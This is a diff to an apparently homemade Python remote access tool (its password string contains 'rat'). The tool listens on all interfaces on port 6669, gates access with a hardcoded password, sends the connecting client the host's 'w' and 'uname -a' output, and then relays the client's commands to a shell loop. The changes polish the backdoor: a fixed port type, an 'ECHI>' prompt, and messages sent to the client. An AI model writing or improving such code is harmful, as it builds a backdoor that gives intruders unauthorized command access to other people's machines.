@@ -13,7 +13,7 @@ w = subprocess.call('w', shell=True)
 
 #Set server to accept connections from any interface, port 6669
 BINDIP = "0.0.0.0"
-BINDPORT = "6669"
+BINDPORT = 6669
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((BINDIP,BINDPORT))
 
@@ -33,15 +33,15 @@ def commands(command):
 
 #main server functions, command parsing
 def shell():
-    run = True
-    while run:
+    while True:
+        clientSocket.send("ECHI> ")
         buffer = ""
         while "\n" not in buffer:
             buffer += clientSocket.recv(1024)
         if buffer == 'quit':
-            print "\n [*] Terminating Connection. Goodbye."
+            clientSocket.send("[*] Terminating Connection. Goodbye.")
             clientSocket.close()
-            run = False
+            break
         else:
             output = commands(buffer)
             clientSocket.send(output)
@@ -53,9 +53,8 @@ def handleClient(clientSocket):
     hashpass = clientSocket.recv(1024)
     if hashpass == 'gunclawpythonratniBBa':
         #send the w and uname to client, jump to shell loop
-        clientSocket.send("\n[+] Accepted Connection")
-        clientSocket.send("Current Users (w):\n"+w+"\n")
-        clientSocket.send("uname -a:\n"+uname+"\n")
+        clientSocket.send("\n[+] Accepted Connection\nCurrent Users (w):\n"+w+"\nuname -a:\n"+uname+"\n")
+
         shell()
     else:
         clientSocket.close()
